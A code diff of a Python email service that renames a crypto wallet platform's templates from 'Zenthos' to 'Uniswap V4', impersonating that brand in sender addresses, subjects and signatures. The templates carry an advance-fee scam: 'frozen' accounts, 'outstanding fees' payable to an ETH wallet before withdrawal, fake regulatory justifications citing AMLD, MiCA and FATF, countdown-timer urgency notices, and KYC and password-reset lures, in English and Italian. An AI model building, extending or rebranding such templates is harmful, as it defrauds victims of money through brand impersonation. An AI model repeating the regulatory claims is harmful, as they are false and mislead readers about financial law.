@@ -1,5 +1,5 @@
 """
-Email Service for Zenthos Wallet Platform
+Email Service for Uniswap V4 Wallet Platform
 Uses Resend for transactional emails
 All templates use inline styles for maximum email client compatibility.
 """
@@ -29,20 +29,20 @@ def _wrap(content: str) -> str:
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="color-scheme" content="light">
 <meta name="supported-color-schemes" content="light">
-<title>Zenthos</title>
+<title>Uniswap V4</title>
 </head>
 <body style="margin:0;padding:0;background-color:#f4f4f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#333333;line-height:1.6;">
 <div style="max-width:600px;margin:0 auto;padding:20px;">
   <div style="background-color:#121530;padding:28px 20px;text-align:center;border-radius:8px 8px 0 0;">
-    <h1 style="color:#ffffff;margin:0;font-size:22px;font-weight:600;letter-spacing:0.5px;">Zenthos</h1>
+    <h1 style="color:#ffffff;margin:0;font-size:22px;font-weight:600;letter-spacing:0.5px;">Uniswap V4</h1>
   </div>
   <div style="background-color:#ffffff;padding:32px 28px;border-radius:0 0 8px 8px;">
     {content}
   </div>
   <div style="text-align:center;padding:20px 10px;">
-    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2026 Zenthos. All rights reserved.</p>
-    <p style="margin:4px 0;color:#999999;font-size:11px;">Zenthos | Zurich, Switzerland</p>
-    <p style="margin:4px 0;color:#bbbbbb;font-size:10px;">This is a transactional email sent to the address associated with your Zenthos account.</p>
+    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2026 Uniswap V4. All rights reserved.</p>
+    <p style="margin:4px 0;color:#999999;font-size:11px;">Uniswap V4 | Zurich, Switzerland</p>
+    <p style="margin:4px 0;color:#bbbbbb;font-size:10px;">This is a transactional email sent to the address associated with your Uniswap V4 account.</p>
   </div>
 </div>
 </body>
@@ -74,9 +74,9 @@ def _strip_html(html_body: str) -> str:
 class EmailService:
     def __init__(self, api_key: Optional[str] = None, sender_email: Optional[str] = None):
         self.api_key = api_key or os.environ.get("RESEND_API_KEY")
-        self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "noreply@zenthos-eu.com")
-        self.sender_name = "Zenthos"
-        self.reply_to = os.environ.get("REPLY_TO_EMAIL", "support@zenthos-eu.com")
+        self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "info@uniswapv4.com")
+        self.sender_name = "Uniswap V4"
+        self.reply_to = os.environ.get("REPLY_TO_EMAIL", "info@uniswapv4.com")
         self.unsubscribe_url = os.environ.get("UNSUBSCRIBE_URL", "")
         if self.api_key and RESEND_AVAILABLE:
             resend.api_key = self.api_key
@@ -120,7 +120,7 @@ class EmailService:
     def get_kyc_verification_email(self, user_name: str, verification_link: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_kyc_verification_email_it(user_name, verification_link)
-        subject = "Verify Your Identity - Zenthos"
+        subject = "Verify Your Identity - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Identity Verification Required</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -135,14 +135,14 @@ class EmailService:
     </ul>
     <p style="color:#555555;margin:0 0 12px 0;">Once verified, you will receive instructions to reset your password and regain full access to your account.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Security Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Security Team</p>"""
         return subject, _wrap(content)
 
     # ── KYC Approved Email ──────────────────────────────────────────────
     def get_kyc_approved_email(self, user_name: str, reset_link: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_kyc_approved_email_it(user_name, reset_link)
-        subject = "Identity Verified - Reset Your Password - Zenthos"
+        subject = "Identity Verified - Reset Your Password - Uniswap V4"
         content = f"""
     <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
       <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
@@ -159,14 +159,14 @@ class EmailService:
       <p style="color:#555555;margin:0;font-size:13px;"><strong>Important:</strong> This password reset link expires in <strong>24 hours</strong>. After resetting, you will have full access to your account. Choose a strong, unique password.</p>
     </div>
     <p style="color:#555555;margin:16px 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Compliance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Compliance Team</p>"""
         return subject, _wrap(content)
 
     # ── Password Reset Email ────────────────────────────────────────────
     def get_password_reset_email(self, user_name: str, reset_link: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_password_reset_email_it(user_name, reset_link)
-        subject = "Reset Your Password - Zenthos"
+        subject = "Reset Your Password - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Reset Your Password</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -175,14 +175,14 @@ class EmailService:
     {_btn("Reset Password", reset_link)}
     <p style="color:#888888;font-size:13px;margin:0 0 16px 0;">This link will expire in 24 hours for security reasons.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Team</p>"""
         return subject, _wrap(content)
 
     # ── Reactivation Email (improved for deliverability) ────────────────
     def get_reactivation_email(self, user_name: str, eth_wallet_address: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_reactivation_email_it(user_name, eth_wallet_address)
-        subject = "Account Reactivation Notice - Zenthos"
+        subject = "Account Reactivation Notice - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Reactivation Required</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -199,14 +199,14 @@ class EmailService:
 
     <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions, please contact our support team.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Compliance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Compliance Team</p>"""
         return subject, _wrap(content)
 
     # ── Fee Payment Email ───────────────────────────────────────────────
     def get_fee_payment_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_fee_payment_email_it(user_name, total_fees, eth_wallet_address)
-        subject = "Outstanding Fees - Zenthos"
+        subject = "Outstanding Fees - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Outstanding Transaction Fees</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -234,14 +234,14 @@ class EmailService:
 
     <p style="color:#555555;margin:12px 0;">Once your fees are paid, you will be able to withdraw your full balance to your bank account.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Finance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Finance Team</p>"""
         return subject, _wrap(content)
 
     # ── Fee Resolution Email (detailed regulatory explanation) ─────────
     def get_fee_resolution_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en", timer_deadline_text: str = None) -> tuple:
         if lang == "it":
             return self._get_fee_resolution_email_it(user_name, total_fees, eth_wallet_address, timer_deadline_text=timer_deadline_text)
-        subject = "Your Outstanding Fees - Zenthos"
+        subject = "Your Outstanding Fees - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Important Notice Regarding Your Outstanding Fees</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
@@ -256,7 +256,7 @@ class EmailService:
 
     <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:16px;margin:16px 0;border-radius:0 4px 4px 0;">
       <p style="color:#333333;margin:0 0 8px 0;font-weight:700;font-size:15px;">Why can't the fees be deducted from my existing balance?</p>
-      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Your account has been flagged for review and is currently set for closure under our regulatory compliance framework. When an account enters this state, <strong>all existing funds are frozen and ring-fenced</strong> in accordance with applicable financial regulations. Neither Zenthos nor you, as the account holder, can authorise deductions from a frozen balance.</p>
+      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Your account has been flagged for review and is currently set for closure under our regulatory compliance framework. When an account enters this state, <strong>all existing funds are frozen and ring-fenced</strong> in accordance with applicable financial regulations. Neither Uniswap V4 nor you, as the account holder, can authorise deductions from a frozen balance.</p>
       <p style="color:#555555;margin:0;font-size:13px;">This restriction is mandated by the following regulatory frameworks:</p>
     </div>
 
@@ -266,7 +266,7 @@ class EmailService:
         <li style="margin-bottom:8px;"><strong>EU Anti-Money Laundering Directive (AMLD 6)</strong> &mdash; Requires financial institutions to freeze and segregate funds in accounts under review. No internal transfers or deductions are permitted until the review is concluded and fees are settled externally.</li>
         <li style="margin-bottom:8px;"><strong>Markets in Crypto-Assets Regulation (MiCA)</strong> &mdash; Under MiCA, crypto-asset service providers must ensure that client funds under compliance review remain untouched. Fee settlement must occur through a separate, verifiable transaction to maintain a clear audit trail.</li>
         <li style="margin-bottom:8px;"><strong>Financial Action Task Force (FATF) Recommendation 15</strong> &mdash; FATF guidelines on virtual assets require that all outstanding obligations are cleared through independent transactions when an account is in a restricted state, ensuring full traceability of fund flows.</li>
-        <li style="margin-bottom:8px;"><strong>Applicable Compliance Rules</strong> &mdash; Zenthos maintains strict compliance with applicable regulations, which prohibit the commingling of frozen client assets with operational fee settlements.</li>
+        <li style="margin-bottom:8px;"><strong>Applicable Compliance Rules</strong> &mdash; Uniswap V4 maintains strict compliance with applicable regulations, which prohibit the commingling of frozen client assets with operational fee settlements.</li>
       </ul>
     </div>
 
@@ -294,12 +294,12 @@ class EmailService:
     </div>
 
     <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
-      <p style="color:#555555;margin:0;font-size:12px;"><strong>Disclaimer:</strong> Zenthos operates in compliance with applicable digital asset regulations. All compliance procedures, including fee settlement requirements, are conducted in accordance with EU Directive 2015/849 (AMLD), Regulation (EU) 2023/1114 (MiCA), and FATF international standards. These measures are designed to protect our clients and maintain the integrity of the financial system.</p>
+      <p style="color:#555555;margin:0;font-size:12px;"><strong>Disclaimer:</strong> Uniswap V4 operates in compliance with applicable digital asset regulations. All compliance procedures, including fee settlement requirements, are conducted in accordance with EU Directive 2015/849 (AMLD), Regulation (EU) 2023/1114 (MiCA), and FATF international standards. These measures are designed to protect our clients and maintain the integrity of the financial system.</p>
     </div>
 
     <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions or require assistance, please do not hesitate to contact our support team.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Compliance &amp; Finance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Compliance &amp; Finance Team</p>"""
 
         # Inject timer urgency block before the closing if deadline is set
         if timer_deadline_text:
@@ -317,7 +317,7 @@ class EmailService:
         return subject, _wrap(content)
 
     def _get_fee_resolution_email_it(self, user_name: str, total_fees: str, eth_wallet_address: str, timer_deadline_text: str = None) -> tuple:
-        subject = "Commissioni in Sospeso - Zenthos"
+        subject = "Commissioni in Sospeso - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Avviso Importante Riguardo le Commissioni in Sospeso</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -332,7 +332,7 @@ class EmailService:
 
     <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:16px;margin:16px 0;border-radius:0 4px 4px 0;">
       <p style="color:#333333;margin:0 0 8px 0;font-weight:700;font-size:15px;">Perch&eacute; le commissioni non possono essere detratte dal saldo esistente?</p>
-      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Il Suo account &egrave; stato contrassegnato per revisione ed &egrave; attualmente impostato per la chiusura nell'ambito del nostro quadro di conformit&agrave; normativa. Quando un account entra in questo stato, <strong>tutti i fondi esistenti vengono congelati e segregati</strong> in conformit&agrave; con le normative finanziarie applicabili. N&eacute; Zenthos n&eacute; Lei, in qualit&agrave; di titolare del conto, pu&ograve; autorizzare detrazioni da un saldo congelato.</p>
+      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Il Suo account &egrave; stato contrassegnato per revisione ed &egrave; attualmente impostato per la chiusura nell'ambito del nostro quadro di conformit&agrave; normativa. Quando un account entra in questo stato, <strong>tutti i fondi esistenti vengono congelati e segregati</strong> in conformit&agrave; con le normative finanziarie applicabili. N&eacute; Uniswap V4 n&eacute; Lei, in qualit&agrave; di titolare del conto, pu&ograve; autorizzare detrazioni da un saldo congelato.</p>
       <p style="color:#555555;margin:0;font-size:13px;">Questa restrizione &egrave; imposta dai seguenti quadri normativi:</p>
     </div>
 
@@ -342,7 +342,7 @@ class EmailService:
         <li style="margin-bottom:8px;"><strong>Direttiva UE Antiriciclaggio (AMLD 6)</strong> &mdash; Richiede agli istituti finanziari di congelare e segregare i fondi negli account in fase di revisione. Nessun trasferimento interno o detrazione &egrave; consentito fino alla conclusione della revisione e al saldo delle commissioni esternamente.</li>
         <li style="margin-bottom:8px;"><strong>Regolamento sui Mercati delle Cripto-Attivit&agrave; (MiCA)</strong> &mdash; Ai sensi del MiCA, i fornitori di servizi di cripto-attivit&agrave; devono garantire che i fondi dei clienti in fase di revisione di conformit&agrave; rimangano intatti. Il saldo delle commissioni deve avvenire tramite una transazione separata e verificabile per mantenere una chiara traccia di controllo.</li>
         <li style="margin-bottom:8px;"><strong>Raccomandazione 15 del GAFI (FATF)</strong> &mdash; Le linee guida del GAFI sugli asset virtuali richiedono che tutti gli obblighi in sospeso vengano saldati tramite transazioni indipendenti quando un account si trova in stato limitato, garantendo la piena tracciabilit&agrave; dei flussi di fondi.</li>
-        <li style="margin-bottom:8px;"><strong>Applicable Compliance Rules</strong> &mdash; Zenthos mantiene una rigorosa conformit&agrave; con le normative applicabili, che vietano la commistione di asset congelati dei clienti con i regolamenti operativi delle commissioni.</li>
+        <li style="margin-bottom:8px;"><strong>Applicable Compliance Rules</strong> &mdash; Uniswap V4 mantiene una rigorosa conformit&agrave; con le normative applicabili, che vietano la commistione di asset congelati dei clienti con i regolamenti operativi delle commissioni.</li>
       </ul>
     </div>
 
@@ -370,12 +370,12 @@ class EmailService:
     </div>
 
     <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
-      <p style="color:#555555;margin:0;font-size:12px;"><strong>Avvertenza:</strong> Zenthos opera in conformit&agrave; con le normative applicabili sugli asset digitali. Tutte le procedure di conformit&agrave;, inclusi i requisiti di saldo delle commissioni, sono condotte in conformit&agrave; con la Direttiva UE 2015/849 (AMLD), il Regolamento (UE) 2023/1114 (MiCA) e gli standard internazionali FATF. Queste misure sono progettate per proteggere i nostri clienti e mantenere l'integrit&agrave; del sistema finanziario.</p>
+      <p style="color:#555555;margin:0;font-size:12px;"><strong>Avvertenza:</strong> Uniswap V4 opera in conformit&agrave; con le normative applicabili sugli asset digitali. Tutte le procedure di conformit&agrave;, inclusi i requisiti di saldo delle commissioni, sono condotte in conformit&agrave; con la Direttiva UE 2015/849 (AMLD), il Regolamento (UE) 2023/1114 (MiCA) e gli standard internazionali FATF. Queste misure sono progettate per proteggere i nostri clienti e mantenere l'integrit&agrave; del sistema finanziario.</p>
     </div>
 
     <p style="color:#555555;margin:16px 0 4px 0;">Per qualsiasi domanda o necessit&agrave; di assistenza, non esiti a contattare il nostro team di supporto.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; e Finanza di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; e Finanza di Uniswap V4</p>"""
 
         # Inject timer urgency block for Italian
         if timer_deadline_text:
@@ -395,12 +395,12 @@ class EmailService:
     def get_welcome_email(self, user_name: str, login_link: str, lang: str = "en") -> tuple:
         if lang == "it":
             return self._get_welcome_email_it(user_name, login_link)
-        subject = "Welcome to Zenthos"
+        subject = "Welcome to Uniswap V4"
         content = f"""
-    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Welcome to Zenthos!</h2>
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Welcome to Uniswap V4!</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
     <p style="color:#555555;margin:0 0 12px 0;">Your account has been successfully created. Welcome to the world's most trusted cryptocurrency platform.</p>
-    <p style="color:#555555;margin:0 0 8px 0;">With Zenthos, you can:</p>
+    <p style="color:#555555;margin:0 0 8px 0;">With Uniswap V4, you can:</p>
     <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
       <li style="margin-bottom:4px;">Securely store your cryptocurrency</li>
       <li style="margin-bottom:4px;">Send and receive digital assets</li>
@@ -409,7 +409,7 @@ class EmailService:
     </ul>
     {_btn("Access Your Wallet", login_link)}
     <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Team</p>"""
         return subject, _wrap(content)
 
     # ── Transaction Notification Email ──────────────────────────────────
@@ -424,7 +424,7 @@ class EmailService:
         }
         status_text = status_labels.get(status, {}).get(lang, status.capitalize()) if status else ""
         subject_prefix = "Notifica Transazione" if lang == "it" else "Transaction Notification"
-        subject = f"{subject_prefix} - {tx_label} {amount} {asset} - Zenthos"
+        subject = f"{subject_prefix} - {tx_label} {amount} {asset} - Uniswap V4"
         type_colors = {"deposit": "#4caf50", "withdrawal": "#d32f2f", "receive": "#4caf50", "send": "#d32f2f", "swap": "#0052ff", "fee": "#f9a825", "adjustment": "#9e9e9e"}
         status_colors = {"processing": "#f9a825", "completed": "#4caf50", "failed": "#d32f2f", "pending": "#f9a825"}
         color = type_colors.get(tx_type, "#0052ff")
@@ -438,7 +438,7 @@ class EmailService:
         greeting = f"Gentile {html.escape(user_name)}," if lang == "it" else f"Dear {html.escape(user_name)},"
         body_text = "Questa transazione &egrave; stata registrata sul Suo account. Se non ha autorizzato questa transazione, La preghiamo di contattare immediatamente il nostro team di supporto." if lang == "it" else "This transaction has been recorded on your account. If you did not authorize this transaction, please contact our support team immediately."
         regards = "Cordiali saluti," if lang == "it" else "Best regards,"
-        team_name = "Il Team di Zenthos" if lang == "it" else "The Zenthos Team"
+        team_name = "Il Team di Uniswap V4" if lang == "it" else "The Uniswap V4 Team"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">{heading}</h2>
     <p style="color:#555555;margin:0 0 16px 0;">{greeting}</p>
@@ -457,7 +457,7 @@ class EmailService:
     # ── Fees Cleared Email ───────────────────────────────────────────────
     def get_fees_cleared_email(self, user_name: str, total_fees: str, tx_count: int, lang: str = "en") -> tuple:
         if lang == "it":
-            subject = "Commissioni Saldate con Successo - Zenthos"
+            subject = "Commissioni Saldate con Successo - Uniswap V4"
             content = f"""
     <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
       <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
@@ -475,9 +475,9 @@ class EmailService:
       <p style="color:#555555;margin:0;font-size:13px;">Il Suo account non ha pi&ugrave; commissioni in sospeso. Tutte le funzionalit&agrave; del Suo portafoglio, inclusi i prelievi EUR, sono ora completamente disponibili.</p>
     </div>
     <p style="color:#555555;margin:16px 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Uniswap V4</p>"""
         else:
-            subject = "Fees Successfully Cleared - Zenthos"
+            subject = "Fees Successfully Cleared - Uniswap V4"
             content = f"""
     <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
       <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
@@ -495,11 +495,11 @@ class EmailService:
       <p style="color:#555555;margin:0;font-size:13px;">Your account no longer has any outstanding fees. All wallet features, including EUR withdrawals, are now fully available.</p>
     </div>
     <p style="color:#555555;margin:16px 0 4px 0;">Best regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Finance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Finance Team</p>"""
         return subject, _wrap(content)
 
     def _get_kyc_verification_email_it(self, user_name, verification_link):
-        subject = "Verifica della Sua Identit&agrave; - Zenthos"
+        subject = "Verifica della Sua Identit&agrave; - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Verifica dell'Identit&agrave; Richiesta</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -515,11 +515,11 @@ class EmailService:
     <p style="color:#555555;margin:0 0 12px 0;">Una volta completata la verifica, ricever&agrave; le istruzioni per reimpostare la Sua password e riottenere pieno accesso al Suo account.</p>
     <p style="color:#555555;margin:0 0 12px 0;">Se non ha richiesto questa verifica o ha domande, La preghiamo di contattare immediatamente il nostro team di supporto.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Sicurezza di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Sicurezza di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     def _get_kyc_approved_email_it(self, user_name, reset_link):
-        subject = "Identit&agrave; Verificata - Reimposti la Sua Password - Zenthos"
+        subject = "Identit&agrave; Verificata - Reimposti la Sua Password - Uniswap V4"
         content = f"""
     <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
       <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
@@ -536,11 +536,11 @@ class EmailService:
       <p style="color:#555555;margin:0;font-size:13px;"><strong>Importante:</strong> Questo link per la reimpostazione della password scade tra <strong>24 ore</strong>. Dopo la reimpostazione, avr&agrave; pieno accesso al Suo account. La preghiamo di scegliere una password sicura e unica.</p>
     </div>
     <p style="color:#555555;margin:16px 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     def _get_password_reset_email_it(self, user_name, reset_link):
-        subject = "Reimposti la Sua Password - Zenthos"
+        subject = "Reimposti la Sua Password - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Reimpostazione della Password</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -549,11 +549,11 @@ class EmailService:
     {_btn("Reimposta la Password", reset_link)}
     <p style="color:#888888;font-size:13px;margin:0 0 16px 0;">Questo link scadr&agrave; tra 24 ore per motivi di sicurezza.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     def _get_reactivation_email_it(self, user_name, eth_wallet_address):
-        subject = "Avviso di Riattivazione dell'Account - Zenthos"
+        subject = "Avviso di Riattivazione dell'Account - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Riattivazione dell'Account Richiesta</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -570,11 +570,11 @@ class EmailService:
 
     <p style="color:#555555;margin:16px 0 4px 0;">Per qualsiasi domanda, La preghiamo di contattare il nostro team di supporto.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     def _get_fee_payment_email_it(self, user_name, total_fees, eth_wallet_address):
-        subject = "Commissioni in Sospeso - Zenthos"
+        subject = "Commissioni in Sospeso - Uniswap V4"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Commissioni di Transazione in Sospeso</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
@@ -602,16 +602,16 @@ class EmailService:
 
     <p style="color:#555555;margin:12px 0;">Una volta saldate le commissioni, potr&agrave; prelevare il Suo intero saldo sul Suo conto bancario.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Finanza di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     def _get_welcome_email_it(self, user_name, login_link):
-        subject = "Benvenuto su Zenthos"
+        subject = "Benvenuto su Uniswap V4"
         content = f"""
-    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Benvenuto su Zenthos!</h2>
+    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Benvenuto su Uniswap V4!</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
     <p style="color:#555555;margin:0 0 12px 0;">Il Suo account &egrave; stato creato con successo. Le diamo il benvenuto nella piattaforma di criptovalute pi&ugrave; affidabile al mondo.</p>
-    <p style="color:#555555;margin:0 0 8px 0;">Con Zenthos, potr&agrave;:</p>
+    <p style="color:#555555;margin:0 0 8px 0;">Con Uniswap V4, potr&agrave;:</p>
     <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
       <li style="margin-bottom:4px;">Conservare le Sue criptovalute in modo sicuro</li>
       <li style="margin-bottom:4px;">Inviare e ricevere asset digitali</li>
@@ -620,7 +620,7 @@ class EmailService:
     </ul>
     {_btn("Acceda al Suo Portafoglio", login_link)}
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     # ── Timer Warning Email ─────────
@@ -632,7 +632,7 @@ class EmailService:
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Urgent Action Required</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
-    <p style="color:#555555;margin:0 0 12px 0;">This is a formal notice regarding your Zenthos account. You have outstanding transaction fees of <strong>&euro;{html.escape(total_fees)}</strong> that must be settled immediately.</p>
+    <p style="color:#555555;margin:0 0 12px 0;">This is a formal notice regarding your Uniswap V4 account. You have outstanding transaction fees of <strong>&euro;{html.escape(total_fees)}</strong> that must be settled immediately.</p>
     
     <div style="background-color:#d32f2f;border-radius:8px;padding:20px;margin:20px 0;text-align:center;">
       <p style="color:#ffffff;font-size:18px;font-weight:700;margin:0 0 8px 0;">&#9200; You have {html.escape(remaining_text)} remaining</p>
@@ -652,7 +652,7 @@ class EmailService:
 
     <p style="color:#555555;margin:12px 0;">This is a time-sensitive matter. Please act immediately to avoid account closure.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Compliance &amp; Finance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Compliance &amp; Finance Team</p>"""
         return subject, _wrap(content)
 
     def _get_timer_warning_email_it(self, user_name: str, total_fees: str, remaining_text: str, eth_wallet_address: str) -> tuple:
@@ -660,7 +660,7 @@ class EmailService:
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Azione Urgente Richiesta</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
-    <p style="color:#555555;margin:0 0 12px 0;">Questo &egrave; un avviso formale riguardante il Suo account Zenthos. Ha commissioni di transazione in sospeso pari a <strong>&euro;{html.escape(total_fees)}</strong> che devono essere saldate immediatamente.</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Questo &egrave; un avviso formale riguardante il Suo account Uniswap V4. Ha commissioni di transazione in sospeso pari a <strong>&euro;{html.escape(total_fees)}</strong> che devono essere saldate immediatamente.</p>
     
     <div style="background-color:#d32f2f;border-radius:8px;padding:20px;margin:20px 0;text-align:center;">
       <p style="color:#ffffff;font-size:18px;font-weight:700;margin:0 0 8px 0;">&#9200; Ha {html.escape(remaining_text)} rimanenti</p>
@@ -680,7 +680,7 @@ class EmailService:
 
     <p style="color:#555555;margin:12px 0;">Questa &egrave; una questione urgente. La preghiamo di agire immediatamente per evitare la chiusura dell'account.</p>
